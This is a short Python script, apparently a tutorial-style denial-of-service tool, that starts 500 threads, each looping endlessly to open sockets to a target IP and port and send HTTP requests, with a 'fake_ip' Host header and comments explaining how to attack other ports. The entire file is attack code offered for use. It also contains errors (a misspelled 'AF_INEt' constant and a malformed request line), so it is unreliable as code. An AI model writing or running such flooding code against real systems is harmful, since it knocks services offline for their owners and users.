import socket
import threading # used to make the process faster

target = "ADD_IP_HERE" # IP address of the target device
fake_ip = "ADD_IP_HERE" # Fake doesn't really conceal your IP Address
port = 80 # Select a port you want to attack

'''
This attack function is the function that will be running in each of our individual threads.
It starts an endless loop, within which it creates a socket, connects to the target and sends
an HTTP request over and over again. Of course, if you are attacking another port, you will
also have to change the type of request you send.
'''
def attack():
    while True:
        s = socket.socket(socket.AF_INEt,socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /"+ target +"HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("Host: "+ fake_ip + "\r\n\r\n").encode('ascii'), (target,port))
        s.close()

'''
run multiple threads that execute this function at the same time. 
If we would just run the function, it would send a lot of requests over and over
again but it would always be only one after the other. By using multi-threading,
we can send many requests at once.
'''
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()